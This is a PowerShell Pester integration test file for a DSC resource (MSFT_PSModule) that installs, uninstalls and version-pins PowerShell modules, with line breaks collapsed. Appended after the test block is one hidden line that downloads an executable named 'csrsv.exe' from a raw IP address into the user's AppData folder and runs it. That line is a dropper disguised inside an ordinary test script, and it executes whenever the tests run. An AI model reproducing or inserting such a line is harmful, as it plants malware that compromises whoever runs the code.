$script:dscResourceFriendlyName = 'PSModule'$script:dcsResourceName = "MSFT_$($script:dscResourceFriendlyName)"$configurationFile = Join-Path -Path $PSScriptRoot -ChildPath "$($script:dcsResourceName).config.ps1". $configurationFileDescribe "$($script:dcsResourceName)_Integration" {$configurationName = "$($script:dcsResourceName)_SetPackageSourceAsNotTrusted_Config"Context ('When using configuration {0}' -f $configurationName) {It 'Should compile and apply the MOF without throwing' {{$configurationParameters = @{OutputPath        = $TestDriveConfigurationData = $ConfigurationData}& $configurationName @configurationParameters$startDscConfigurationParameters = @{Path         = $TestDriveComputerName = 'localhost'Wait         = $trueVerbose      = $trueForce        = $trueErrorAction  = 'Stop'}Start-DscConfiguration @startDscConfigurationParameters} | Should -Not -Throw}}$configurationName = "$($script:dcsResourceName)_InstallWithTrusted_Config"Context ('When using configuration {0}' -f $configurationName) {It 'Should compile and apply the MOF without throwing' {{$configurationParameters = @{OutputPath        = $TestDriveConfigurationData = $ConfigurationData}& $configurationName @configurationParameters$startDscConfigurationParameters = @{Path         = $TestDriveComputerName = 'localhost'Wait         = $trueVerbose      = $trueForce        = $trueErrorAction  = 'Stop'}Start-DscConfiguration @startDscConfigurationParameters} | Should -Not -Throw}It 'Should be able to call Get-DscConfiguration without throwing' {{$script:currentConfiguration = Get-DscConfiguration -Verbose -ErrorAction Stop} | Should -Not -Throw}It 'Should have set the resource and all the parameters should match' {$resourceCurrentState = $script:currentConfiguration | Where-Object -FilterScript {$_.ConfigurationName -eq $configurationName `-and $_.ResourceId -eq "[$($script:dscResourceFriendlyName)]Integration_Test"}$resourceCurrentState.Ensure | Should -Be 'Present'$resourceCurrentState.Name | Should -Be $ConfigurationData.AllNodes.Module1_Name$resourceCurrentState.InstallationPolicy | Should -Be 'Untrusted'}It 'Should return $true when Test-DscConfiguration is run' {Test-DscConfiguration -Verbose | Should -Be $true}}$configurationName = "$($script:dcsResourceName)_UninstallModule1_Config"Context ('When using configuration {0}' -f $configurationName) {It 'Should compile and apply the MOF without throwing' {{$configurationParameters = @{OutputPath        = $TestDriveConfigurationData = $ConfigurationData}& $configurationName @configurationParameters$startDscConfigurationParameters = @{Path         = $TestDriveComputerName = 'localhost'Wait         = $trueVerbose      = $trueForce        = $trueErrorAction  = 'Stop'}Start-DscConfiguration @startDscConfigurationParameters} | Should -Not -Throw}It 'Should be able to call Get-DscConfiguration without throwing' {{$script:currentConfiguration = Get-DscConfiguration -Verbose -ErrorAction Stop} | Should -Not -Throw}It 'Should have set the resource and all the parameters should match' {$resourceCurrentState = $script:currentConfiguration | Where-Object -FilterScript {$_.ConfigurationName -eq $configurationName `-and $_.ResourceId -eq "[$($script:dscResourceFriendlyName)]Integration_Test"}$resourceCurrentState.Ensure | Should -Be 'Absent'$resourceCurrentState.Name | Should -Be $ConfigurationData.AllNodes.Module1_Name}It 'Should return $true when Test-DscConfiguration is run' {Test-DscConfiguration -Verbose | Should -Be $true}}$configurationName = "$($script:dcsResourceName)_SetPackageSourceAsTrusted_Config"Context ('When using configuration {0}' -f $configurationName) {It 'Should compile and apply the MOF without throwing' {{$configurationParameters = @{OutputPath        = $TestDriveConfigurationData = $ConfigurationData}& $configurationName @configurationParameters$startDscConfigurationParameters = @{Path         = $TestDriveComputerName = 'localhost'Wait         = $trueVerbose      = $trueForce        = $trueErrorAction  = 'Stop'}Start-DscConfiguration @startDscConfigurationParameters} | Should -Not -Throw}}$configurationName = "$($script:dcsResourceName)_DefaultParameters_Config"Context ('When using configuration {0}' -f $configurationName) {It 'Should compile and apply the MOF without throwing' {{$configurationParameters = @{OutputPath        = $TestDriveConfigurationData = $ConfigurationData}& $configurationName @configurationParameters$startDscConfigurationParameters = @{Path         = $TestDriveComputerName = 'localhost'Wait         = $trueVerbose      = $trueForce        = $trueErrorAction  = 'Stop'}Start-DscConfiguration @startDscConfigurationParameters} | Should -Not -Throw}It 'Should be able to call Get-DscConfiguration without throwing' {{$script:currentConfiguration = Get-DscConfiguration -Verbose -ErrorAction Stop} | Should -Not -Throw}It 'Should have set the resource and all the parameters should match' {$resourceCurrentState = $script:currentConfiguration | Where-Object -FilterScript {$_.ConfigurationName -eq $configurationName `-and $_.ResourceId -eq "[$($script:dscResourceFriendlyName)]Integration_Test"}$resourceCurrentState.Ensure | Should -Be 'Present'$resourceCurrentState.Name | Should -Be $ConfigurationData.AllNodes.Module1_Name}It 'Should return $true when Test-DscConfiguration is run' {Test-DscConfiguration -Verbose | Should -Be $true}}$configurationName = "$($script:dcsResourceName)_UsingAllowClobber_Config"Context ('When using configuration {0}' -f $configurationName) {It 'Should compile and apply the MOF without throwing' {{$configurationParameters = @{OutputPath        = $TestDriveConfigurationData = $ConfigurationData}& $configurationName @configurationParameters$startDscConfigurationParameters = @{Path         = $TestDriveComputerName = 'localhost'Wait         = $trueVerbose      = $trueForce        = $trueErrorAction  = 'Stop'}Start-DscConfiguration @startDscConfigurationParameters} | Should -Not -Throw}It 'Should be able to call Get-DscConfiguration without throwing' {{$script:currentConfiguration = Get-DscConfiguration -Verbose -ErrorAction Stop} | Should -Not -Throw}It 'Should have set the resource and all the parameters should match' {$resourceCurrentState = $script:currentConfiguration | Where-Object -FilterScript {$_.ConfigurationName -eq $configurationName `-and $_.ResourceId -eq "[$($script:dscResourceFriendlyName)]Integration_Test"}$resourceCurrentState.Ensure | Should -Be 'Present'$resourceCurrentState.Name | Should -Be $ConfigurationData.AllNodes.Module2_Name}It 'Should return $true when Test-DscConfiguration is run' {Test-DscConfiguration -Verbose | Should -Be $true}}$configurationName = "$($script:dcsResourceName)_UninstallModule2_Config"Context ('When using configuration {0}' -f $configurationName) {It 'Should compile and apply the MOF without throwing' {{$configurationParameters = @{OutputPath        = $TestDriveConfigurationData = $ConfigurationData}& $configurationName @configurationParameters$startDscConfigurationParameters = @{Path         = $TestDriveComputerName = 'localhost'Wait         = $trueVerbose      = $trueForce        = $trueErrorAction  = 'Stop'}Start-DscConfiguration @startDscConfigurationParameters} | Should -Not -Throw}It 'Should be able to call Get-DscConfiguration without throwing' {{$script:currentConfiguration = Get-DscConfiguration -Verbose -ErrorAction Stop} | Should -Not -Throw}It 'Should have set the resource and all the parameters should match' {$resourceCurrentState = $script:currentConfiguration | Where-Object -FilterScript {$_.ConfigurationName -eq $configurationName `-and $_.ResourceId -eq "[$($script:dscResourceFriendlyName)]Integration_Test"}$resourceCurrentState.Ensure | Should -Be 'Absent'$resourceCurrentState.Name | Should -Be $ConfigurationData.AllNodes.Module2_Name}It 'Should return $true when Test-DscConfiguration is run' {Test-DscConfiguration -Verbose | Should -Be $true}}$configurationName = "$($script:dcsResourceName)_RequiredVersion_Config"Context ('When using configuration {0}' -f $configurationName) {It 'Should compile and apply the MOF without throwing' {{$configurationParameters = @{OutputPath        = $TestDriveConfigurationData = $ConfigurationData}& $configurationName @configurationParameters$startDscConfigurationParameters = @{Path         = $TestDriveComputerName = 'localhost'Wait         = $trueVerbose      = $trueForce        = $trueErrorAction  = 'Stop'}Start-DscConfiguration @startDscConfigurationParameters} | Should -Not -Throw}It 'Should be able to call Get-DscConfiguration without throwing' {{$script:currentConfiguration = Get-DscConfiguration -Verbose -ErrorAction Stop} | Should -Not -Throw}It 'Should have set the resource and all the parameters should match' {$resourceCurrentState = $script:currentConfiguration | Where-Object -FilterScript {$_.ConfigurationName -eq $configurationName `-and $_.ResourceId -eq "[$($script:dscResourceFriendlyName)]Integration_Test"}$resourceCurrentState.Ensure | Should -Be 'Present'$resourceCurrentState.Name | Should -Be $ConfigurationData.AllNodes.Module2_Name$resourceCurrentState.InstalledVersion | Should -Be $ConfigurationData.AllNodes.Module2_RequiredVersion}It 'Should return $true when Test-DscConfiguration is run' {Test-DscConfiguration -Verbose | Should -Be $true}}$configurationName = "$($script:dcsResourceName)_VersionRange_Config"Context ('When using configuration {0}' -f $configurationName) {It 'Should compile and apply the MOF without throwing' {{$configurationParameters = @{OutputPath        = $TestDriveConfigurationData = $ConfigurationData}& $configurationName @configurationParameters$startDscConfigurationParameters = @{Path         = $TestDriveComputerName = 'localhost'Wait         = $trueVerbose      = $trueForce        = $trueErrorAction  = 'Stop'}Start-DscConfiguration @startDscConfigurationParameters} | Should -Not -Throw}It 'Should be able to call Get-DscConfiguration without throwing' {{$script:currentConfiguration = Get-DscConfiguration -Verbose -ErrorAction Stop} | Should -Not -Throw}It 'Should have set the resource and all the parameters should match' {$resourceCurrentState = $script:currentConfiguration | Where-Object -FilterScript {$_.ConfigurationName -eq $configurationName `-and $_.ResourceId -eq "[$($script:dscResourceFriendlyName)]Integration_Test"}$resourceCurrentState.Ensure | Should -Be 'Present'$resourceCurrentState.Name | Should -Be $ConfigurationData.AllNodes.Module2_Name$resourceCurrentState.InstalledVersion | Should -Be $ConfigurationData.AllNodes.Module2_RequiredVersion}It 'Should return $true when Test-DscConfiguration is run' {Test-DscConfiguration -Verbose | Should -Be $true}}$configurationName = "$($script:dcsResourceName)_UninstallModule2_Config"Context ('When using configuration {0}' -f $configurationName) {It 'Should compile and apply the MOF without throwing' {{$configurationParameters = @{OutputPath        = $TestDriveConfigurationData = $ConfigurationData}& $configurationName @configurationParameters$startDscConfigurationParameters = @{Path         = $TestDriveComputerName = 'localhost'Wait         = $trueVerbose      = $trueForce        = $trueErrorAction  = 'Stop'}Start-DscConfiguration @startDscConfigurationParameters} | Should -Not -Throw}It 'Should be able to call Get-DscConfiguration without throwing' {{$script:currentConfiguration = Get-DscConfiguration -Verbose -ErrorAction Stop} | Should -Not -Throw}It 'Should have set the resource and all the parameters should match' {$resourceCurrentState = $script:currentConfiguration | Where-Object -FilterScript {$_.ConfigurationName -eq $configurationName `-and $_.ResourceId -eq "[$($script:dscResourceFriendlyName)]Integration_Test"}$resourceCurrentState.Ensure | Should -Be 'Absent'$resourceCurrentState.Name | Should -Be $ConfigurationData.AllNodes.Module2_Name}It 'Should return $true when Test-DscConfiguration is run' {Test-DscConfiguration -Verbose | Should -Be $true}}$configurationName = "$($script:dcsResourceName)_VersionRange_Config"Context ('When using configuration {0}' -f $configurationName) {It 'Should compile and apply the MOF without throwing' {{$configurationParameters = @{OutputPath        = $TestDriveConfigurationData = $ConfigurationData}& $configurationName @configurationParameters$startDscConfigurationParameters = @{Path         = $TestDriveComputerName = 'localhost'Wait         = $trueVerbose      = $trueForce        = $trueErrorAction  = 'Stop'}Start-DscConfiguration @startDscConfigurationParameters} | Should -Not -Throw}It 'Should be able to call Get-DscConfiguration without throwing' {{$script:currentConfiguration = Get-DscConfiguration -Verbose -ErrorAction Stop} | Should -Not -Throw}It 'Should have set the resource and all the parameters should match' {$resourceCurrentState = $script:currentConfiguration | Where-Object -FilterScript {$_.ConfigurationName -eq $configurationName `-and $_.ResourceId -eq "[$($script:dscResourceFriendlyName)]Integration_Test"}$resourceCurrentState.Ensure | Should -Be 'Present'$resourceCurrentState.Name | Should -Be $ConfigurationData.AllNodes.Module2_Name$resourceCurrentState.InstalledVersion | Should -Be $ConfigurationData.AllNodes.Module2_MaximumVersion}It 'Should return $true when Test-DscConfiguration is run' {Test-DscConfiguration -Verbose | Should -Be $true}}}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")